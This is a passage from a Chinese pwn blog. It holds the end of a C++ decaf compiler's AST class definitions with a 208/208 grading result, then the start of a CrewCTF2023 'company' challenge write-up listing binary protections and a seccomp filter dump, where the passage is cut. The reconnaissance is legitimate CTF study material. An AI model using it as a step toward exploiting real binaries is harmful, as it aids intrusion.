class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">if</span>(Arr == <span class="literal">NULL</span>)</span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignVar&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;AssignArrayLoc&quot;</span>) + <span class="string">&quot;(&quot;</span> + Var + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Arr)+<span class="string">&quot;,&quot;</span>+ <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>; </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAssignList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafAssign *&gt;List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAssign *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_keys</span><span class="params">(<span class="keyword">bool</span> key)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> ass:List)&#123;</span><br><span class="line">			ass-&gt;<span class="built_in">put_key</span>(key);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> commaList&lt;class decafAssign *&gt;(List);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafAssign *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafBlock</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	string BloKind;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafStmts *StateDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafBlock</span>(string blokind,decafVarList *fieldlist, decafStmts *methodlist) </span><br><span class="line">		: <span class="built_in">BloKind</span>(blokind), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">StateDeclList</span>(methodlist) &#123; <span class="keyword">this</span>-&gt;kind = dblo; &#125;</span><br><span class="line">	~<span class="built_in">decafBlock</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (StateDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> StateDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> BloKind + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(StateDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara * Para;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type *lType;</span><br><span class="line">	llvm::Function *lfunc;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara * Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_block</span><span class="params">(decafBlock *Block)</span></span>&#123; <span class="keyword">this</span>-&gt;Block = Block; &#125;</span><br><span class="line">	<span class="function">decafBlock *<span class="title">get_block</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block; &#125;</span><br><span class="line">	<span class="function">decafPara *<span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Method&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFuncDefList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafFuncDef*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafFuncDef*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafFuncDefList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafFuncDef*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafFuncDef *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafFuncDef *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDef</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	string Type;</span><br><span class="line">	decafPara* Para;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	llvm::Type *lType;</span><br><span class="line">	llvm::Function *lfunc;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_para</span><span class="params">(decafPara* Para)</span></span>&#123; <span class="keyword">this</span>-&gt;Para = Para;&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_name</span><span class="params">(string *Name)</span></span>&#123; <span class="keyword">this</span>-&gt;Name = *Name; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_type</span><span class="params">(decafType* type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;Type = type-&gt;<span class="built_in">get_type</span>();</span><br><span class="line">		<span class="keyword">this</span>-&gt;lType = type-&gt;lType;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">get_name</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Name; &#125;</span><br><span class="line">	<span class="function">string <span class="title">get_type</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Type; &#125;</span><br><span class="line">	<span class="function">decafPara* <span class="title">get_para</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Para; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ExternFunction&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + Type + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Para) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafEXFuncDefList</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	list&lt;decafEXFuncDef*&gt; List;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">list&lt;decafEXFuncDef*&gt; <span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> List.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafEXFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafEXFuncDef *e)</span> </span>&#123; List.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">cat_front</span><span class="params">(decafEXFuncDefList* List)</span> </span>&#123;</span><br><span class="line">		list&lt;decafEXFuncDef*&gt; l = List-&gt;<span class="built_in">get_list</span>();</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:l)&#123;</span><br><span class="line">			<span class="keyword">this</span>-&gt;List.<span class="built_in">push_front</span>(e); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">put_types</span><span class="params">(decafType* Type)</span></span>&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">auto</span> e:<span class="keyword">this</span>-&gt;List)&#123;</span><br><span class="line">			e-&gt;<span class="built_in">put_type</span>(Type); </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123;<span class="keyword">return</span> commaList&lt;class decafEXFuncDef *&gt;(List);&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> listCodegen&lt;decafEXFuncDef *&gt;(List); </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	string Name;</span><br><span class="line">	decafVarList *FieldDeclList;</span><br><span class="line">	decafFuncDefList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafVarList *fieldlist, decafFuncDefList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">		TheModule-&gt;<span class="built_in">setModuleIdentifier</span>(llvm::<span class="built_in">StringRef</span>(Name)); </span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != FieldDeclList) &#123;</span><br><span class="line">			val = FieldDeclList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != MethodDeclList) &#123;</span><br><span class="line">			val = MethodDeclList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125; </span><br><span class="line">		<span class="comment">// Q: should we enter the class name into the symbol table?</span></span><br><span class="line">		<span class="keyword">return</span> val; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafIF</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafBinexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafBlock * Block2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafIF</span>(decafBinexp * Exp,decafBlock * Block,decafBlock * Block2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">Block2</span>(Block2)&#123;&#125;</span><br><span class="line">	<span class="function">decafBinexp * <span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125; </span><br><span class="line">	<span class="function">decafBlock * <span class="title">get_block</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block; &#125; </span><br><span class="line">	<span class="function">decafBlock * <span class="title">get_block2</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block2; &#125; </span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;IfStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block2) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafWhile</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafBinexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function">decafBinexp *<span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="function">decafBlock *<span class="title">get_block</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block; &#125;</span><br><span class="line">	<span class="built_in">decafWhile</span>(decafBinexp * Exp,decafBlock * Block): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block)&#123;&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;WhileStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafFor</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafBinexp * Exp;</span><br><span class="line">	decafBlock * Block;</span><br><span class="line">	decafAssignList *List;</span><br><span class="line">	decafAssignList *List2;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafFor</span>(decafBinexp * Exp,decafBlock * Block,decafAssignList *List,decafAssignList *List2): <span class="built_in">Exp</span>(Exp),<span class="built_in">Block</span>(Block),<span class="built_in">List</span>(List),<span class="built_in">List2</span>(List2)&#123;&#125;</span><br><span class="line">	<span class="function">decafBinexp *<span class="title">get_exp</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="function">decafBlock *<span class="title">get_block</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;Block; &#125;</span><br><span class="line">	<span class="function">decafAssignList *<span class="title">get_list</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List; &#125;</span><br><span class="line">	<span class="function">decafAssignList *<span class="title">get_list2</span><span class="params">()</span></span>&#123;<span class="keyword">return</span> <span class="keyword">this</span>-&gt;List2; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ForStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(List)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Exp) +<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(List2)+<span class="string">&quot;,&quot;</span>+<span class="built_in">getString</span>(Block) + <span class="string">&quot;)&quot;</span>; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafReturn</span> :</span> <span class="keyword">public</span> decafStmt &#123;</span><br><span class="line">	decafBinexp * Exp;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafReturn</span>()&#123;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">decafReturn</span>(decafBinexp * Exp)&#123; </span><br><span class="line">		<span class="keyword">this</span>-&gt;Exp = Exp;</span><br><span class="line">		<span class="keyword">this</span>-&gt;kind = dret;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">decafBinexp* <span class="title">get_exp</span><span class="params">()</span></span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>-&gt;Exp; &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;ReturnStmt&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(Exp) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProgramAST - the decaf program</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123;</span><br><span class="line">	decafEXFuncDefList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafEXFuncDefList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">	<span class="function">llvm::Value *<span class="title">Codegen</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		llvm::Value *val = <span class="literal">NULL</span>;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != ExternList) &#123;</span><br><span class="line">			val = ExternList-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> != PackageDef) &#123;</span><br><span class="line">			val = PackageDef-&gt;<span class="built_in">Codegen</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="built_in">runtime_error</span>(<span class="string">&quot;no package definition in decaf program&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> val; </span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>最终结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Correct(dev): <span class="number">208</span> / <span class="number">208</span></span><br><span class="line">Score(dev): <span class="number">208.00</span></span><br><span class="line">Total Score: <span class="number">208.00</span></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/07/14/CrewCTF2023/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/07/14/CrewCTF2023/" class="post-title-link" itemprop="url">CrewCTF2023</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-07-14 00:05:14 / Modified: 00:06:47" itemprop="dateCreated datePublished" datetime="2023-07-14T00:05:14+08:00">2023-07-14</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Competition/" itemprop="url" rel="index"><span itemprop="name">Competition</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="company"><a href="#company" class="headerlink" title="company"></a>company</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.37</span><span class="number">-0u</span>buntu2)</span> stable release version 2.37.</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">company: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1579b</span>b98d790ece68a2411728f492e944628bd50, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>Full RELRO，Canary，NX</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x08</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0010</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"><span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A == open) <span 